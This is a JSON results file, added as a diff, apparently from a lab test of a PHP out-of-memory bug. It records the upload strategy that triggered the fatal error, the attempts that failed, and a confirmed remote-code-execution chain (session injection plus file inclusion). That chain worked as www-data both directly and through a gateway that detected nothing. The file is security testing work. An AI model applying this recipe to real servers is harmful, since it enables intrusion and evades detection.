@@ -1,0 +1,37 @@
+{
+  "target": "10.20.0.226:8091 (php:8.4.26-apache, mod_php, memory_limit 128M, session.upload_progress.enabled On)",
+  "poc": {
+    "repo": "https://github.com/ikow/php2shell-poc",
+    "retrieved": "2026-11-24"
+  },
+  "oom_trigger": {
+    "result": "fatal reached",
+    "strategy": "no_length --total-mb 200 (chunked, no Content-Length -> bypasses post_max_size)",
+    "evidence": "response body contains 'Allowed memory size of 134217728 bytes exhausted'; the worker survives (next request 200), which is the mod_php condition the bug needs",
+    "negative_attempts": [
+      "headers 5000x500 (~9MB PHP): 200, no OOM",
+      "headers 20000x2000 (~154MB est): 200, no OOM - part headers are not amplified as estimated",
+      "nested width 5000 depth 10: 200, no OOM",
+      "nested width 20000 depth 12: 200, no OOM"
+    ]
+  },
+  "rce": {
+    "chain": "A (session injection + LFI), public exploit exploit/chain_a_session_lfi.py",
+    "preconditions": [
+      "an LFI sink in the app (/vuln.php with include($_GET['page']))",
+      "session.upload_progress.cleanup=Off; with the default On the planted session file is deleted before the include and the chain returns an empty body (4 attempts)"
+    ],
+    "direct": "RCE CONFIRMED: uid=33(www-data) gid=33(www-data) groups=33(www-data) - first attempt",
+    "through_gateway": "RCE CONFIRMED: uid=33(www-data) ... - first attempt, via 127.0.0.1:8740 (HTTP/1.1 cleartext gateway, backend 10.20.0.226:8091)",
+    "gateway_detections": 0
+  },
+  "files": [
+    "chain-a-2.txt",
+    "chain-a-3.txt",
+    "chain-a-through-gateway.txt",
+    "chain-a.txt",
+    "verify-headers-40mb.txt",
+    "verify-headers.txt",
+    "verify-matrix.txt"
+  ]
+}
